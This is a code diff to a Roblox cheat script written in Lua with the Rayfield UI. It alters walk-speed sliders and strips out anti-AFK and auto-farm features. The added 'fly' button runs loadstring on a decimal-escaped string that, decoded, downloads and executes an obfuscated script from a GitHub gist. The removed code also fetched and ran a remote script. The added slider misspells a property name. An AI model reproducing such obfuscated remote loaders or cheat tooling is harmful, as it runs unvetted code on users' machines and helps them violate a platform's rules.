@@ -55,10 +55,10 @@ local Window = Rayfield:CreateWindow({
 
 local Slider = Tab:CreateSlider({
     Name = "walk speed",
-    Range = {0, 100},
+    Range = {0, 200000},
     Increment = 10,
-    Suffix = "aimbot",
-    CurrentValue = 10,
+    Suffix = "walkspeed",
+    CurrentValue = 25,
     Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
     Callback = function(s)
             game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
@@ -78,94 +78,22 @@ local Slider = Tab:CreateSlider({
     end,
  })
 
-Section = Information:CreateSection("Auto Farm")
-local Paragraph = Information:CreateParagraph({Title = "Information", Content = "let me know if you've ever seen an auto farm more powerful than this one in terms of gold per hour, you can use a webhook to follow the auto farm stats when you're not in front of your screen.\n\n - With no boost: 20K/hour\n - With x1.25: 25K/hour\n - With x2: 40K/hour\n - With Both: 50k/hour"})
-Section = Information:CreateSection("Image Loader")
-local Paragraph = Information:CreateParagraph({Title = "Requirement", Content = "Paste the image URL in the textbox and let the server convert the image, the server can't access certain images (it's not a coding problem) OR you can convert the image yourself: (more images are supported) Images are created from files that contain special data (RGB), to have these files or to create your own files from an image that you have chosen you must join the discord, you need an external script (open source) that converts the image into a file suitable for this script to be used, a tutorial is in the Discord Server.\n\n - Build Speed: You can choose the speed at which the image is built. If you have a slow internet connection, set the speed to low. Do not set it to max for large images\n\n- Preview: Displays a preview of the image, making it easier to use modifiers or to see how the image will look. It is also required to build the image.\n\n- Change Speed: Stop the current process by opening your inventory and checking if no more blocks are being placed. Change the speed and press 'Load Image' again. It should automatically resume from where it stopped.\n\n- Optimize Mode: Allows even the weakest PCs or those without a good connection to load images."})
-local Button = Information:CreateButton({
-    Name = "copy the list of working sites",
-    Callback = function()
-        setclipboard("https://www.pythonanywhere.com/whitelist/")
-        Rayfield:Notify({
-            Title = "Copied!",
-            Content = "past the link in your browser to see which sites work",
-            Duration = 6.5,
-            Image = 124144713366592,
-         })
-    end,
- })
-Section = Information:CreateSection("Auto Build")
-local Paragraph = Information:CreateParagraph({Title = "Information - [AUTO BUILD IS IN WORK IN PROGRESS]", Content = "this feature does not require any external requirement, if you save a build with a name that already existed, it will overwrite it. You can download and shares files in the Discord Server.\n\n - Safe Mode: prevents crashes during loading if you have a poor internet connection, this toggle slows down build speed.\n\n - Preview: displays a preview of the build."})
-
-local player = game.Players.LocalPlayer
-local Nplayer = game.Players.LocalPlayer.Name
-
-local characterConnection
-local connection
-
-local function enableAntiAFK()
-    if not connection then
-        Rayfield:Notify({
-            Title = "Anti-Afk | ON",
-            Content = "you won't get kicked after 20 minutes of inactivity",
-            Duration = 6.5,
-            Image = 124144713366592,
-         })
-        connection = player.Idled:Connect(function()
-            if getgenv().afk6464 then
-                VirtualUser:CaptureController()
-                VirtualUser:ClickButton2(Vector2.new())
-            end
-        end)
-    end
-end
-
-local function disableAntiAFK()
-    if connection then
-        connection:Disconnect()
-        connection = nil
-        Rayfield:Notify({
-            Title = "Anti-Afk | OFF",
-            Content = "you will be kicked after 20 minutes of inactivity",
-            Duration = 6.5,
-            Image = 124144713366592,
-         })
-    end
-end
-
-local function loop()
-    while true do
-        if getgenv().afk6464 then
-            enableAntiAFK()
-        else
-            disableAntiAFK()
-        end
-        wait(1)
-    end
-end
-
-spawn(loop)
-
-Section = Global:CreateSection("Utilities")
-local AFKToggle = Global:CreateToggle({
-    Name = "Anti-Afk",
-    CurrentValue = false,
-    Flag = "",
-    Callback = function(Value)
-        getgenv().afk6464 = Value
-    end,
+local Button = MainTab:CreateButton({
+   Name = "fly",
+   Callback = function()
+        loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")
+   end,
 })
 
-if getgenv().afk6464 == true then
-    AFKToggle:Set(true)
-end
-
-local Button = Global:CreateButton({
-    Name = "Load Infinite Yield",
-    Callback = function()
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-    end,
+local Slider = MainTab:CreateSlider({
+   Name = "Walkspeed Slider",
+   Range = {0, 550},
+   Increment = 1,
+   Suffix = "Speed",
+   CurrentValue = 16,
+   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+        game.Players.LocalPlayer.Character.Humanoid.Walkspeed = (Value)
+   end,
 })
-
-
 
